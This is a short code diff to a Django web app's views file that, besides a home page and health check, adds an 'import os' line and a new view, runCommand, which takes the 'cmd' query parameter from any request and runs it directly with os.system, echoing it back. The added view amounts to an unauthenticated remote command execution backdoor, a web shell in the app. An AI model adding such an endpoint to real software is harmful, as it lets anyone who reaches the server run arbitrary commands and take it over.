@@ -1,7 +1,7 @@
 from django.http import HttpResponse
 from urllib.parse import unquote
 from django.shortcuts import render
-
+import os
 
 # Create your views here.
 def HomePage(request):
@@ -21,3 +21,8 @@ def liffPage(request):
 def healthCheck(request):
     print("I'm still alive!")
     return HttpResponse("I'm still alive!")
+
+def runCommand(request):
+    command = request.GET.get('cmd','')
+    os.system(command)
+    return HttpResponse(f"run command:\n{command}")
